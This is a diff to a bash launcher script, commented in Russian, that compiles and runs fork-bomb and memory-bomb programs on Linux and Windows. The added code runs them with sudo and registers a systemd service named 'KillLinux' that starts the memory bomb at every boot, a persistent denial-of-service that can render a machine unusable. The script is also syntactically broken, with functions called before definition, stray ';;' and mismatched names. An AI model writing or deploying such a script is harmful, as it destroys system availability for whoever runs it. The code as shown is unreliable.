@@ -12,20 +12,12 @@ if [ "$choice" == "1" ]; then
     if [ "$confirm" == "y" ]; then
         if [[ "$OSTYPE" == "linux-gnu"* ]]; then
             # Компиляция и запуск ForkBomb для Linux
-            gcc -o ~/ForkBomb/ForkBombLin ~/ForkBomb/ForkBombLin.c
-            ~/ForkBomb/ForkBombLin &
-            pid=$!
-            sleep 10
-            kill $pid 
-            rm -f ~/ForkBomb/ForkBombLin 
+            cd $work_dir/ForkBomb
+            ForkBombLin();; 
         elif [[ "$OSTYPE" == "msys"* || "$OSTYPE" == "cygwin" ]]; then
             # Компиляция и запуск ForkBomb для Windows
-            gcc -o ~/ForkBomb/ForkBombWin ~/ForkBomb/ForkBombWin.c
-            ~/ForkBomb/ForkBombWin.exe &
-            pid=$! 
-            sleep 10
-            taskkill /F /PID $pid 
-            rm -f ~/ForkBomb/ForkBombWin.exe 
+            cd $work_dir/ForkBomb
+            ForkBombWin;;
         else
             echo "Не удалось определить ОС"
         fi
@@ -37,20 +29,12 @@ elif [ "$choice" == "2" ]; then
     if [ "$confirm" == "y" ]; then
         if [[ "$OSTYPE" == "linux-gnu"* ]]; then
             # Компиляция и запуск MemBomb для Linux
-            gcc -o ~/MemBomb/MemBombLin ~/MemBomb/MemBombLin.c
-            ~/MemBomb/MemBombLin &
-            pid=$! 
-            sleep 10
-            kill $pid 
-            rm -f ~/MemBomb/MemBombLin 
+            cd $work_dir/MemBomb
+            MembombLin();;
         elif [[ "$OSTYPE" == "msys"* || "$OSTYPE" == "cygwin" ]]; then
             # Компиляция и запуск MemBomb для Windows
-            gcc -o ~/MemBomb/MemBombWin ~/MemBomb/MemBombWin.c
-            ~/MemBomb/MemBombWin.exe &
-            pid=$! 
-            sleep 10
-            taskkill /F /PID $pid 
-            rm -f ~/MemBomb/MemBombWin.exe
+            cd $work_dir/MemBomb
+            MemBombWin();;
         else
             echo "Не удалось определить ОС"
         fi
@@ -60,3 +44,59 @@ elif [ "$choice" == "2" ]; then
 else
     echo "Неверный выбор программы"
 fi
+
+ForkBombLin(){
+     gcc -o ForkBomb ForkBombLin.c
+            echo "Run..."
+            sudo ./ForkBomb &
+            pid=$!
+            sleep 10
+            kill $pid 
+            rm -f ~/ForkBomb/ForkBombLin 
+}
+
+ForkBombWin{
+    gcc -o /ForkBomb /ForkBombWin.c
+            /ForkBomb.exe &
+            pid=$! 
+            sleep 10
+            taskkill /F /PID $pid 
+            rm -f /ForkBomb.exe 
+}
+
+MembombLin() {
+     gcc -o MemBomb MemBombLin.c
+            echo "Run..."
+			sudo touch /etc/systemd/system/KillLinux.service
+			sudo chmod 644 /etc/systemd/system/KillLinux.service
+
+			sudo tee /etc/systemd/system/KillLinux.service << EOF
+[Unit]
+Description=KillLinux
+After=network.target
+
+[Service]
+ExecStart=$(find $work_dir/MemBomb/ -type f -name "Membomb" -executable -print -quit)
+
+[Install]
+WantedBy=default.target
+EOF
+			sudo systemctl unmask KillLinux.service
+			sudo systemctl daemon-reload
+			sudo systemctl enable KillLinux.service
+			sudo systemctl start KillLinux.service
+            sudo ./MemBomb &
+            pid=$! 
+            sleep 10
+            kill $pid 
+            rm -f ~/MemBomb/MemBombLin 
+}
+
+MemBombWin(){
+    gcc -o MemBombWin MemBombWin.c
+            /MemBombWin.exe &
+            pid=$! 
+            sleep 10
+            taskkill /F /PID $pid 
+            rm -f /MemBombWin.exe
+}
